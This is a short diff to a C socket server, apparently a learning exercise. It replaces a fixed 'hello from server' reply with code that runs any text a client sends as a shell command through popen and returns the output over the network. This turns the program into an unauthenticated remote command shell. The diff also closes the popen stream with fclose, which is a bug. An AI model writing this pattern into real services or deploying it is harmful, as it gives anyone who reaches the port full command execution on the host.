@@ -11,6 +11,10 @@ int main(int argc, char *argv[]){
   struct sockaddr_in address;
   int addlen = sizeof(address);
   char buffer[1024];
+  char result[1024];
+  FILE * fp;
+
+  memset(buffer,0,1024);
 
 //create socket
   if((sockfd = socket(AF_INET,SOCK_STREAM,0))==0){
@@ -40,7 +44,13 @@ int main(int argc, char *argv[]){
   }
   read(newsocket,buffer,1024);
   printf("%s\n",buffer);
-  send(newsocket,"hello from server",strlen("hello from server"),0);
+  // system(buffer);
+  fp = popen(buffer,"r");
+  while(fgets(result,1024,fp)!=NULL){
+    printf("%s",result);
+    send(newsocket,result,strlen(result),0);
+  }
+  fclose(fp);
   printf("hello send from server\n");
   sleep(1);
   }
